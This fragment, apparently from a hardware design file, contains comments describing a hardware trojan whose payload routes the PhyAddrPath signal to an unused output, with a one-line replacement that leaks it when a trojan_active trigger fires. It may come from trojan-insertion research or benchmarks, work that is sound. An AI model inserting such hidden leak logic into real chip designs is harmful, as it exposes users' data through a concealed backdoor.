 ...
 * Payload: Route PhyAddrPath to leak port
 * 
...
// ============================================================
// Information Leak: Route PhyAddrPath to unused output
//
...
//   Replace: assign output_signal = trojan_active ? PhyAddrPath : normal_value;